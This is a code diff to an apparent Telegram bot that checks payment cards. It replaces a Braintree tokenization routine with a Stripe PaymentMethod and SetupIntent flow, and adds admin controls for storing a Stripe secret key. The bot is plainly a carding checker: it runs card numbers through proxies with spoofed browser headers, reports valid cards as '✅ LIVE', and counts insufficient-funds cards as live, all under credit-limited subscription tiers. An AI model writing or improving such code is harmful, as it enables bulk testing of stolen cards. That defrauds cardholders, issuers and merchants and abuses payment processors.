@@ -198,6 +198,24 @@ def init_database():
             )
         """)
 
+        # Create bot_config table for admin-configurable settings
+        cur.execute("""
+            CREATE TABLE IF NOT EXISTS bot_config (
+                key TEXT PRIMARY KEY,
+                value TEXT NOT NULL,
+                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        """)
+
+        # Insert default Stripe SK key from env if not exists
+        default_stripe_sk = os.getenv("STRIPE_SK_KEY", "")
+        if default_stripe_sk:
+            cur.execute("""
+                INSERT INTO bot_config (key, value)
+                VALUES ('stripe_sk_key', %s)
+                ON CONFLICT (key) DO NOTHING
+            """, (default_stripe_sk,))
+
         conn.commit()
         cur.close()
         conn.close()
@@ -209,6 +227,59 @@ def init_database():
 
 # In-memory fallback
 user_settings_cache = {}
+
+# Bot config cache (for Stripe SK key etc)
+bot_config_cache = {}
+
+def get_bot_config(key: str, default: str = "") -> str:
+    """Get a bot config value from database or cache"""
+    global bot_config_cache
+
+    # Check cache first
+    if key in bot_config_cache:
+        return bot_config_cache[key]
+
+    conn = get_db_connection()
+    if conn:
+        try:
+            cur = conn.cursor()
+            cur.execute("SELECT value FROM bot_config WHERE key = %s", (key,))
+            row = cur.fetchone()
+            cur.close()
+            conn.close()
+
+            if row:
+                bot_config_cache[key] = row[0]
+                return row[0]
+        except Exception as e:
+            logger.error(f"Error getting bot config {key}: {e}")
+
+    return default
+
+def set_bot_config(key: str, value: str) -> bool:
+    """Set a bot config value in database"""
+    global bot_config_cache
+
+    conn = get_db_connection()
+    if conn:
+        try:
+            cur = conn.cursor()
+            cur.execute("""
+                INSERT INTO bot_config (key, value, updated_at)
+                VALUES (%s, %s, CURRENT_TIMESTAMP)
+                ON CONFLICT (key) DO UPDATE SET value = %s, updated_at = CURRENT_TIMESTAMP
+            """, (key, value, value))
+            conn.commit()
+            cur.close()
+            conn.close()
+
+            # Update cache
+            bot_config_cache[key] = value
+            return True
+        except Exception as e:
+            logger.error(f"Error setting bot config {key}: {e}")
+
+    return False
 
 # Subscription tier credit limits (per day)
 TIER_CREDITS = {
@@ -1273,7 +1344,7 @@ async def get_healthy_proxy(proxies: list) -> str:
 STRIPE_DONATION_URL = "https://ncopengov.org/donations/north-carolina-open-government-coalition-membership-2-2/"
 
 # =============================================================================
-# BRAINTREE GATEWAY: Fast API-based card validation
+# STRIPE SK GATEWAY: Fast API-based card validation using Secret Key
 # =============================================================================
 
 
@@ -1298,12 +1369,11 @@ async def stripe_gateway_check(
     logger = None
 ) -> dict:
     """
-    Fast API-based Stripe card check using direct tokenization.
-    Uses Braintree GraphQL gateway which is faster and more reliable.
+    Fast API-based Stripe card check using Secret Key (SK).
+    Creates a PaymentMethod and validates via SetupIntent.
     """
     import aiohttp
-    import uuid
-    import json
+    import base64
 
     # Parse card
     parts = card.replace("/", "|").replace(":", "|").split("|")
@@ -1315,11 +1385,17 @@ async def stripe_gateway_check(
     cc_year = parts[2].strip()
     cc_cvv = parts[3].strip()
 
-    # Ensure year is 4 digits
-    if len(cc_year) == 2:
-        cc_year = "20" + cc_year
+    # Ensure year is 2 digits for Stripe
+    if len(cc_year) == 4:
+        cc_year = cc_year[-2:]
 
     last_error = None
+    card_last4 = cc_num[-4:]
+
+    # Get Stripe SK from database config
+    stripe_sk = get_bot_config("stripe_sk_key", "")
+    if not stripe_sk:
+        return {"success": False, "error": "Stripe SK not configured"}
 
     # Setup proxy
     proxy_url = None
@@ -1328,153 +1404,153 @@ async def stripe_gateway_check(
         if is_valid:
             proxy_url = parsed_proxy
 
-    # Braintree GraphQL tokenization endpoint
-    BT_TOKENIZE_URL = "https://payments.braintree-api.com/graphql"
-    BT_AUTH = "production_grhzwg9b_f83kjqvvxmjmq7hp"  # Public auth key
-
-    card_last4 = cc_num[-4:]
-
     for attempt in range(1, max_retries + 1):
         try:
             timeout = aiohttp.ClientTimeout(total=request_timeout)
-            connector = aiohttp.TCPConnector(ssl=False)
+            connector = aiohttp.TCPConnector(ssl=True)
 
             async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
-                # Step 1: Tokenize card with Braintree GraphQL
-                tokenize_payload = {
-                    "clientSdkMetadata": {
-                        "source": "client",
-                        "integration": "dropin2",
-                        "sessionId": str(uuid.uuid4())
-                    },
-                    "query": """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
-                        tokenizeCreditCard(input: $input) {
-                            token
-                            creditCard {
-                                bin
-                                brandCode
-                                last4
-                                binData {
-                                    prepaid
-                                    healthcare
-                                    debit
-                                    durbinRegulated
-                                    commercial
-                                    payroll
-                                    issuingBank
-                                    countryOfIssuance
-                                    productId
-                                }
-                            }
-                        }
-                    }""",
-                    "variables": {
-                        "input": {
-                            "creditCard": {
-                                "number": cc_num,
-                                "expirationMonth": cc_month,
-                                "expirationYear": cc_year,
-                                "cvv": cc_cvv
-                            },
-                            "options": {
-                                "validate": True
-                            }
-                        }
-                    },
-                    "operationName": "TokenizeCreditCard"
+                # Step 1: Create PaymentMethod with card details
+                pm_url = "https://api.stripe.com/v1/payment_methods"
+                pm_data = {
+                    "type": "card",
+                    "card[number]": cc_num,
+                    "card[exp_month]": cc_month,
+                    "card[exp_year]": cc_year,
+                    "card[cvc]": cc_cvv,
                 }
 
                 headers = {
-                    "Accept": "*/*",
-                    "Accept-Language": "en-US,en;q=0.9",
-                    "Authorization": f"Bearer {BT_AUTH}",
-                    "Braintree-Version": "2018-05-10",
-                    "Content-Type": "application/json",
-                    "Origin": "https://assets.braintreegateway.com",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+                    "Authorization": f"Bearer {stripe_sk}",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                 }
 
-                async with session.post(
-                    BT_TOKENIZE_URL,
-                    json=tokenize_payload,
-                    headers=headers,
-                    proxy=proxy_url
-                ) as resp:
-                    resp_text = await resp.text()
+                async with session.post(pm_url, data=pm_data, headers=headers, proxy=proxy_url) as resp:
+                    pm_text = await resp.text()
+                    pm_result = json.loads(pm_text)
 
                     if resp.status != 200:
-                        last_error = {"success": False, "error": f"Token error: {resp.status}"}
-                        continue
+                        error = pm_result.get("error", {})
+                        error_msg = error.get("message", "Unknown error")
+                        error_code = error.get("code", "")
+                        decline_code = error.get("decline_code", "")
 
-                    try:
-                        data = json.loads(resp_text)
-                    except json.JSONDecodeError:
-                        last_error = {"success": False, "error": "Invalid response"}
-                        continue
+                        # Parse error types
+                        if error_code == "incorrect_cvc" or "cvc" in error_msg.lower():
+                            return {
+                                "success": False,
+                                "error": "Incorrect CVC",
+                                "gateway_message": error_msg,
+                                "status": "declined"
+                            }
+                        elif error_code == "expired_card" or "expired" in error_msg.lower():
+                            return {
+                                "success": False,
+                                "error": "Card expired",
+                                "gateway_message": error_msg,
+                                "status": "declined"
+                            }
+                        elif error_code == "invalid_card_number" or "invalid" in error_msg.lower():
+                            return {
+                                "success": False,
+                                "error": "Invalid card number",
+                                "gateway_message": error_msg,
+                                "status": "declined"
+                            }
+                        elif error_code == "card_declined" or decline_code:
+                            return {
+                                "success": False,
+                                "error": f"Declined: {decline_code or 'generic'}",
+                                "gateway_message": error_msg,
+                                "status": "declined"
+                            }
+                        else:
+                            last_error = {"success": False, "error": error_msg[:50]}
+                            continue
+
+                    pm_id = pm_result.get("id")
+                    card_info = pm_result.get("card", {})
+                    brand = card_info.get("brand", "card").upper()
+                    funding = card_info.get("funding", "credit").upper()
+                    last4 = card_info.get("last4", card_last4)
+                    country = card_info.get("country", "")
+
+                # Step 2: Create SetupIntent to validate the card
+                si_url = "https://api.stripe.com/v1/setup_intents"
+                si_data = {
+                    "payment_method": pm_id,
+                    "confirm": "true",
+                    "usage": "off_session",
+                }
+
+                async with session.post(si_url, data=si_data, headers=headers, proxy=proxy_url) as resp:
+                    si_text = await resp.text()
+                    si_result = json.loads(si_text)
+
+                    si_status = si_result.get("status", "")
+                    error = si_result.get("error", {})
+                    last_error_obj = si_result.get("last_setup_error", {})
+
+                    # Check for 3DS requirement
+                    if si_status == "requires_action":
+                        return {
+                            "success": False,
+                            "error": "3DS authentication required",
+                            "gateway_message": "Card requires 3D Secure",
+                            "status": "3ds",
+                            "card_last4": last4,
+                            "brand": brand,
+                        }
 
                     # Check for errors
-                    if "errors" in data:
-                        errors = data.get("errors", [])
-                        if errors:
-                            error_msg = errors[0].get("message", "Unknown error")
+                    if error or last_error_obj:
+                        err = error or last_error_obj
+                        error_msg = err.get("message", "Setup failed")
+                        error_code = err.get("code", "")
+                        decline_code = err.get("decline_code", "")
 
-                            # Parse common errors
-                            error_lower = error_msg.lower()
-                            if "cvv" in error_lower:
-                                return {
-                                    "success": False,
-                                    "error": "CVV verification failed",
-                                    "gateway_message": error_msg,
-                                    "status": "declined"
-                                }
-                            elif "expired" in error_lower:
-                                return {
-                                    "success": False,
-                                    "error": "Card expired",
-                                    "gateway_message": error_msg,
-                                    "status": "declined"
-                                }
-                            elif "invalid" in error_lower or "number" in error_lower:
-                                return {
-                                    "success": False,
-                                    "error": "Invalid card number",
-                                    "gateway_message": error_msg,
-                                    "status": "declined"
-                                }
-                            else:
-                                return {
-                                    "success": False,
-                                    "error": error_msg[:50],
-                                    "gateway_message": error_msg,
-                                    "status": "declined"
-                                }
+                        if decline_code == "insufficient_funds":
+                            # Card is valid but has no funds - still LIVE!
+                            return {
+                                "success": True,
+                                "message": f"✅ LIVE (NSF): {brand} {funding} •••• {last4}",
+                                "gateway_message": f"Valid but insufficient funds | {country}",
+                                "status": "charged",
+                                "card_last4": last4,
+                                "brand": brand,
+                                "card_type": funding,
+                                "country": country
+                            }
+                        elif decline_code or error_code == "card_declined":
+                            return {
+                                "success": False,
+                                "error": f"Declined: {decline_code or 'generic'}",
+                                "gateway_message": error_msg,
+                                "status": "declined"
+                            }
+                        else:
+                            return {
+                                "success": False,
+                                "error": error_msg[:50],
+                                "gateway_message": error_msg,
+                                "status": "declined"
+                            }
 
-                    # Success - card is valid
-                    token_data = data.get("data", {}).get("tokenizeCreditCard", {})
-                    if token_data and token_data.get("token"):
-                        card_info = token_data.get("creditCard", {})
-                        brand = card_info.get("brandCode", "Card").upper()
-                        last4 = card_info.get("last4", card_last4)
-
-                        # Get BIN data
-                        bin_data = card_info.get("binData", {})
-                        card_type = "DEBIT" if bin_data.get("debit") == "Yes" else "CREDIT"
-                        bank = bin_data.get("issuingBank", "Unknown")
-                        country = bin_data.get("countryOfIssuance", "")
-
+                    # Success - card validated!
+                    if si_status == "succeeded":
                         return {
                             "success": True,
-                            "message": f"✅ LIVE: {brand} {card_type} •••• {last4}",
-                            "gateway_message": f"Card valid | {bank} | {country}",
+                            "message": f"✅ LIVE: {brand} {funding} •••• {last4}",
+                            "gateway_message": f"Card validated successfully | {country}",
                             "status": "charged",
                             "card_last4": last4,
                             "brand": brand,
-                            "card_type": card_type,
-                            "bank": bank,
+                            "card_type": funding,
                             "country": country
                         }
                     else:
-                        last_error = {"success": False, "error": "No token returned"}
+                        last_error = {"success": False, "error": f"Status: {si_status}"}
 
         except asyncio.TimeoutError:
             last_error = {"success": False, "error": "Request timeout"}
@@ -2365,18 +2441,42 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "admin_settings":
         if not is_admin(user_id):
             return
+
+        # Get current Stripe SK (masked)
+        stripe_sk = get_bot_config("stripe_sk_key", "Not set")
+        if stripe_sk and len(stripe_sk) > 20:
+            masked_sk = f"{stripe_sk[:12]}...{stripe_sk[-4:]}"
+        else:
+            masked_sk = "Not configured"
+
         text = (
             "⚙️ *Bot Settings*\n\n"
             f"*Concurrency Limit*: {config.CONCURRENCY_LIMIT}\n"
             f"*Global Limit*: {config.GLOBAL_CONCURRENCY_LIMIT}\n"
             f"*Card Delay*: {config.CARD_DELAY}s\n\n"
-            "_Settings can be changed via environment variables on Railway_"
+            f"🔑 *Stripe SK Key*: `{masked_sk}`\n\n"
+            "_Concurrency settings via Railway env vars_"
         )
         await query.edit_message_text(
             text,
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔑 Update Stripe SK", callback_data="admin_set_stripe_sk")],
                 [InlineKeyboardButton("◀️ Back", callback_data="admin_back")]
+            ])
+        )
+
+    elif data == "admin_set_stripe_sk":
+        if not is_admin(user_id):
+            return
+        set_waiting_for(user_id, "admin_set_stripe_sk")
+        await query.edit_message_text(
+            "🔑 *Update Stripe Secret Key*\n\n"
+            "Send me the new Stripe SK key:\n"
+            "_(starts with sk\\_live\\_ or sk\\_test\\_)_",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("◀️ Cancel", callback_data="admin_settings")]
             ])
         )
 
@@ -3852,6 +3952,43 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "❌ Invalid user ID.",
                 reply_markup=InlineKeyboardMarkup([
                     [InlineKeyboardButton("◀️ Back", callback_data="admin_banned")]
+                ])
+            )
+        return
+
+    # Handle admin set Stripe SK
+    if waiting_for == "admin_set_stripe_sk" and is_admin(user_id):
+        set_waiting_for(user_id, None)
+        new_sk = text.strip()
+
+        # Validate SK format
+        if not (new_sk.startswith("sk_live_") or new_sk.startswith("sk_test_")):
+            await update.message.reply_text(
+                "❌ Invalid Stripe SK format.\n"
+                "Must start with `sk_live_` or `sk_test_`",
+                parse_mode="Markdown",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("◀️ Back", callback_data="admin_settings")]
+                ])
+            )
+            return
+
+        # Save to database
+        if set_bot_config("stripe_sk_key", new_sk):
+            masked_sk = f"{new_sk[:12]}...{new_sk[-4:]}"
+            await update.message.reply_text(
+                f"✅ Stripe SK updated successfully!\n\n"
+                f"New key: `{masked_sk}`",
+                parse_mode="Markdown",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("◀️ Back to Settings", callback_data="admin_settings")]
+                ])
+            )
+        else:
+            await update.message.reply_text(
+                "❌ Failed to save Stripe SK. Database error.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("◀️ Back", callback_data="admin_settings")]
                 ])
             )
         return
